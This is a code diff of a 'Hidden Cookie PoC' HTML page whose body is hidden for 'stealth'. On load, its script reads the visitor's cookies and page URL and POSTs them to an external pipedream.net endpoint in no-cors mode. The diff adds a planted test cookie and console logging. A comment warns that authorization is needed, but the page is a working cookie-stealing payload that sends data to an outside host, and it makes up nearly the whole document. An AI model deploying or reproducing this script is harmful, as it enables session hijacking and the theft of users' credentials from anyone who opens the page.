@@ -4,26 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hidden Cookie PoC</title>
-    <!-- No visible content to keep it stealthy -->
     <style>
         body {
-            display: none; /* Hide everything */
+            display: none; /* Hide everything for stealth */
         }
     </style>
 </head>
 <body>
-    <!-- No UI elements; everything is hidden -->
+    <!-- No UI elements; fully hidden -->
 
     <script>
         // WARNING: This code AUTOMATICALLY captures REAL cookies and sends them to an external server.
-        // ONLY use this on systems YOU OWN or have WRITTEN PERMISSION to test.
+        // ONLY use on systems YOU OWN or have WRITTEN PERMISSION to test.
         // Unauthorized cookie theft is ILLEGAL and can lead to CRIMINAL charges.
         // Ensure you control https://eoy4evvlsf7y0jq.m.pipedream.net/ to avoid data leaks.
         (function() {
+            // Set a test cookie to ensure something is captured (for debugging)
+            document.cookie = "testCookie=debug123; path=/; SameSite=Lax";
+
             // Capture real cookies
             const realCookies = document.cookie || "No cookies found";
 
-            // Immediately send cookies to the specified URL
+            // Log to console for troubleshooting (invisible to users)
+            console.log("Captured cookies:", realCookies);
+            console.log("Page URL:", window.location.href);
+            console.log("Sending to: https://eoy4evvlsf7y0jq.m.pipedream.net/");
+
+            // Send cookies to the specified URL
             fetch("https://eoy4evvlsf7y0jq.m.pipedream.net/", {
                 method: "POST",
                 headers: {
@@ -32,12 +39,14 @@
                 body: JSON.stringify({
                     cookies: realCookies,
                     timestamp: new Date().toISOString(),
-                    source: window.location.href // Optional: track origin
+                    source: window.location.href
                 }),
-                mode: "no-cors" // Bypass CORS for stealth (may limit server response)
+                mode: "no-cors" // Stealth: bypass CORS (response is opaque)
+            })
+            .then(() => {
+                console.log("Request sent successfully");
             })
             .catch(error => {
-                // Silently handle errors to avoid detection
                 console.error("Error sending cookies:", error);
             });
         })();
